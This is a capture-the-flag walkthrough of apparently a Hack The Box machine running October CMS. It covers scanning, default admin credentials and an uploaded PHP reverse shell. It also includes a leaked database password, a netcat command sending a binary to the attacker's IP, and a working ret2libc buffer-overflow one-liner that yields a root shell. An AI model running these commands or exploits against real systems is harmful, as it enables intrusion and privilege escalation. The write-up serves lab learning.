
![image](https://user-images.githubusercontent.com/68326057/117101929-ded1f980-ad94-11eb-84a7-b05ed3257c4f.png)


# NMAP
```bash
PORT   STATE SERVICE REASON  VERSION

22/tcp open  ssh     syn-ack OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBANmRR7UDp17vLPWjPYGFFxhFHygkw1gVmWZCAUO+TBY4OPnIWGRwrG+zyo39zVror9IS7wgI8rGUuwSd0Yc0xOYlrnZ9jvE7x/H5+Bm8MLaT4QIOI8PSjoRU4a8dhw2zSYC7oSkndmyf22oTvLCv6I37FrazfIm2KTPh2+GtcA6rAAAAFQD6rlN7SzmW/f8uXdfVU1CjnokgpwAAAIA++cp5Tl4bw7yKZO6Odr1fgs+96yEb0B0pGpuvOXdd970m6Tci3uPlDiUyYLI1mAfBzQ15m4JUgsGyuMcAkI7ScqRt7Ar/O9YKoRG2FUPKQAMyJ1Q2QgmuSuaiQePhVFZBQfeMin77oigq8ftCMvypSSh0xQQ/mQTI46n+rN4K1AAAAIBnU+X2K0HarUrflRS2kY1F0ezirxLPlvbsQSGU3S6ETNXUcrp4YCQBtNRx7vb5WH3GgJ/u3vZcJLPEDEHpLf5dOY9P6dOZaDv1uMQfbfejnzpgej7WqK9f+QZVGh5tG0bZl0TgQfoOeRInCZRPSiuOlhVaRENYD9xKoVvp8arXSg==
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5Txq4c0jb5/pJpdDRWMw6kGit+0TeEKq3yWPLLPifxMillxkW1P4j51ANiLUE9wQjzBticFF4Ql6lplrrVft50grpQb+2qyB6l7Bg8dd3GZykdJkyGjwS7urx//EhODxvOA2Fl5KL9Zr3/ql8VnfYTgXvvNCfuY0QxTUauG/YYbQ5qwvfbzyqX88Ym2l1S8JRft2MKFhZWzcNKBrWCeBraioFFLRZqPPSir4emSWKp5zRFFteU9OS8xlw0dezzwAJM+maTF2fU4cXpeaC5rig/S4FTNV0B5fmDac4pg+HIvejIMFIMcE1Ue7UsUvfiE/+vQW19vyPZFtq14NdeBJb
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWJqXjmPMM11lDdFy512ITtTx1mh4bP6jxTLmGYtSBYkUUlQVJkX+WQen/zcnmWFlRvHzlsj5dflsXKnzgifkk=
|   256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIA/9PENIoYUITEQDOKLYfiaUxVAgpixE8w//rH53DU7u

80/tcp open  http    syn-ack Apache httpd 2.4.7 ((Ubuntu))
|_http-favicon: Unknown favicon MD5: 1D585CCF71E2EB73F03BCF484CFC2259
| http-methods: 
|   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: October CMS - Vanilla
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

# WEB

![image](https://user-images.githubusercontent.com/68326057/117102400-e0e88800-ad95-11eb-9307-b26985e785ea.png)


--> https://github.com/octobercms

```bash
October CMS - Upload Protection Bypass Code Execution (Metasploit)                                   | php/remote/47376.rb
October CMS 1.0.412 - Multiple Vulnerabilities                                                       | php/webapps/41936.txt
October CMS < 1.0.431 - Cross-Site Scripting                                                         | php/webapps/44144.txt
October CMS Build 465 - Arbitrary File Read Exploit (Authenticated)                                  | php/webapps/49045.sh
October CMS User Plugin 1.4.5 - Persistent Cross-Site Scripting                                      | php/webapps/44546.txt
OctoberCMS 1.0.425 (Build 425) - Cross-Site Scripting                                                | php/webapps/42978.txt
OctoberCMS 1.0.426 (Build 426) - Cross-Site Request Forgery                                          | php/webapps/43106.txt
```

--> https://www.exploit-db.com/exploits/41936

And Forum are using Vailla CMS

```bash
Vanilla 1.1.3 - Blind SQL Injection                                                                  | php/webapps/4548.php
Vanilla Forum 2.0.17.9 - Local File Inclusion                                                        | php/webapps/17295.txt
Vanilla Forums 2-0-18-4 - SQL Injection                                                              | php/webapps/24927.txt
Vanilla Forums 2.0 < 2.0.18.5 - 'class.utilitycontroller.php' PHP Object Injection                   | php/webapps/29512.txt
Vanilla Forums 2.0.18.8 - Multiple Vulnerabilities                                                   | php/webapps/25720.txt
Vanilla Forums < 2.3 - Remote Code Execution                                                         | php/remote/41996.sh
```

--> Admin blog is written in 2017 .
--> So version might also be from 2017.

--> dicoverd /backend using gobuster

## 10.10.10.16/backend/backend/auth/signin

![image](https://user-images.githubusercontent.com/68326057/117105754-4fc8df80-ad9c-11eb-8705-45d0fc292603.png)


```bash
admin: admin --> worked here XD
```

![image](https://user-images.githubusercontent.com/68326057/117105864-84d53200-ad9c-11eb-88c5-06b0b137fb4d.png)

So, make a reverse shell using php5

Upload it on media

--> http://10.10.10.16/storage/app/media/k.php5

![image](https://user-images.githubusercontent.com/68326057/117106136-f57c4e80-ad9c-11eb-88ae-ba87566e9728.png)


![image](https://user-images.githubusercontent.com/68326057/117106178-0927b500-ad9d-11eb-8e84-f1a7510681f8.png)

## Users

```bash
root:x:0:0:root:/root:/bin/bash
harry:x:1000:1000:Harry Varthakouris,,,:/home/harry:/bin/bash
```

![image](https://user-images.githubusercontent.com/68326057/117106464-86ebc080-ad9d-11eb-8ab2-7e770d773fe9.png)


There is -> /usr/local/bin/ovrflw

```php
mysql' => [                                                                                                                   
            'driver'    => 'mysql',                                                                                                    
            'host'      => 'localhost',                                                                                                
            'port'      => '',                                                                                                         
            'database'  => 'october',                                                                                                  
            'username'  => 'october',                                                                                                  
            'password'  => 'OctoberCMSPassword!!',                                                                                     
            'charset'   => 'utf8',                                                                                                     
            'collation' => 'utf8_unicode_ci',                                                                                          
            'prefix'    => '',                                                                                                         
        ],                      
```

![image](https://user-images.githubusercontent.com/68326057/117106773-0f6a6100-ad9e-11eb-97eb-2c7f9136f29a.png)


![image](https://user-images.githubusercontent.com/68326057/117106871-3b85e200-ad9e-11eb-8524-800c6c3f258e.png)

Nothing USEfull.


## To download Binary

On attacker:-
```bash
nc -l -p 999 > ovrflw
```

On victim:-
```bash
nc -w 5 10.10.14.21 999 < /usr/local/bin/ovrflw
```

```python
import subprocess


for i in range(1000):
        try:
                payload='A'*i
                a=subprocess.check_output("./ovrflw "+payload,shell=True)
        except:
                print("ovrflow at -->",i)
                break
```

![image](https://user-images.githubusercontent.com/68326057/117108503-ec8d7c00-ada0-11eb-895f-984dd5e3301c.png)

```bash
gdb-peda$ c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0x0
ECX: 0xffffd440 --> 0x417941 ('AyA')
EDX: 0xffffd161 --> 0x417941 ('AyA')
ESI: 0xf7fad000 --> 0x1d6d6c
EDI: 0xf7fad000 --> 0x1d6d6c
EBP: 0x6941414d ('MAAi')
ESP: 0xffffd110 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
EIP: 0x41384141 ('AA8A')
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41384141
[------------------------------------stack-------------------------------------]
0000| 0xffffd110 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0004| 0xffffd114 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0008| 0xffffd118 ("AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0012| 0xffffd11c ("AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0016| 0xffffd120 ("PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0020| 0xffffd124 ("AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0024| 0xffffd128 ("AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
0028| 0xffffd12c ("RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41384141 in ?? ()
gdb-peda$ pattern_offset 0x41384141 200
1094205761 found at offset: 112

````

```bash
System = 0xb75e5310
    Exit = 0xb75d8260
    /bin/sh = 0xb7707bac
    little endian format = “\x10\x53\x5e\xb7\x60\x82\x5d\xb7\xac\x7b\x70\xb7”
 ```
 
 ```bash
 while true; do /usr/local/bin/ovrflw $(python -c 'print "A" * 112 + "\x10\x53\x5e\xb7\x60\x82\x5d\xb7\xac\x7b\x70\xb7"');done
 ```
 
 ![image](https://user-images.githubusercontent.com/68326057/117124174-9ecf3e80-adb5-11eb-8784-8df2c1cad1e4.png)

